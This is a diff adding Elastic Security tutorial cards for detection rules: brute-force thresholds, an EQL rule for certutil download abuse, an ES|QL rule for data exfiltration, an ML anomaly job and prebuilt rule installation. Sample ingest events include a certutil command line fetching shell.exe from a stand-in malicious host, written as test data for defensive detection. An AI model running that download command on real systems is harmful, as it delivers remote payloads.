@@ -1170,7 +1170,62 @@ PUT _cluster/settings
 
 <span class="c">// AFTER the node has booted back up and joined the cluster:</span>
 PUT _cluster/settings
-{ <span class="k">"persistent"</span>: { <span class="k">"cluster.routing.allocation.enable"</span>: <span class="s">"all"</span> } }</div></div>`, "advanced"]
+{ <span class="k">"persistent"</span>: { <span class="k">"cluster.routing.allocation.enable"</span>: <span class="s">"all"</span> } }</div></div>`, "advanced"],
+["Brute Force Detection: Threshold Rules",
+`<p><strong>Step 1:</strong> Navigate to <strong>Security</strong> > <strong>Rules</strong> and create a <strong>Threshold</strong> rule.</p>
+<p><strong>Step 2:</strong> Set the KQL query:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">event.category : "authentication" AND event.outcome : "failure"</div></div>
+<p><strong>Step 3:</strong> Group by <code>source.ip</code>, Count > 10, Window 5m.</p>
+<p><strong>Step 4:</strong> Ingest test data (run 11+ times):</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-system.auth-default/_doc
+{
+<span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:00:00Z"</span>,
+<span class="k">"event.category"</span>: <span class="s">"authentication"</span>,
+<span class="k">"event.outcome"</span>: <span class="s">"failure"</span>,
+<span class="k">"source.ip"</span>: <span class="s">"192.168.1.50"</span>,
+<span class="k">"user.name"</span>: <span class="s">"admin"</span>,
+<span class="k">"message"</span>: <span class="s">"Failed password for admin"</span>
+}</div></div>`, "advanced"],
+["Suspicious Process: EQL Correlation",
+`<p><strong>Step 1:</strong> Create an <strong>Event Correlation (EQL)</strong> rule.</p>
+<p><strong>Step 2:</strong> Set the EQL query:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">process where process.name == "certutil.exe" and 
+process.args : ("*urlcache*", "*split*", "*download*")</div></div>
+<p><strong>Step 3:</strong> Ingest sample endpoint event:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-endpoint.events.process-default/_doc
+{
+<span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:05:00Z"</span>,
+<span class="k">"process.name"</span>: <span class="s">"certutil.exe"</span>,
+<span class="k">"process.args"</span>: [<span class="s">"-urlcache"</span>, <span class="s">"-split"</span>, <span class="s">"-f"</span>, <span class="s">"http://malicious-site.com/shell.exe"</span>],
+<span class="k">"host.name"</span>: <span class="s">"HR-Laptop-01"</span>,
+<span class="k">"user.name"</span>: <span class="s">"jdoe"</span>
+}</div></div>`, "advanced"],
+["Data Exfiltration: ES|QL Detection",
+`<p><strong>Step 1:</strong> Create an <strong>ES|QL</strong> rule.</p>
+<p><strong>Step 2:</strong> Set the ES|QL query:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">FROM logs-network*
+| STATS total_bytes = SUM(destination.bytes) BY source.ip, user.name
+| WHERE total_bytes > 500000000
+| SORT total_bytes DESC</div></div>
+<p><strong>Step 3:</strong> Ingest high-volume network event:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-network-default/_doc
+{
+<span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:10:00Z"</span>,
+<span class="k">"source.ip"</span>: <span class="s">"10.0.0.5"</span>,
+<span class="k">"user.name"</span>: <span class="s">"v.kumar"</span>,
+<span class="k">"destination.bytes"</span>: <span class="n">600000000</span>,
+<span class="k">"destination.ip"</span>: <span class="s">"203.0.113.10"</span>
+}</div></div>`, "advanced"],
+["Anomaly Detection: Machine Learning Rules",
+`<p><strong>Step 1:</strong> Create an ML Job (<strong>Machine Learning</strong> > <strong>Anomaly Detection</strong>).</p>
+<p><strong>Step 2:</strong> Use <code>rare</code> detector on <code>source.geo.country_iso_code</code>.</p>
+<p><strong>Step 3:</strong> Create a Security Rule of type <strong>Machine Learning</strong> and select your job.</p>
+<p><strong>Step 4:</strong> Set Anomaly Score Threshold to <strong>75</strong>.</p>`, "advanced"],
+["Bulk Install Prebuilt Rules: Security API",
+`<p><strong>Step 1:</strong> Run installation API in Dev Tools:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT /api/detection_engine/rules/prebuilt</div></div>
+<p><strong>Step 2:</strong> Verify counts:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET /api/detection_engine/rules/_find?per_page=1</div></div>`, "advanced"]
       ]
     };
 
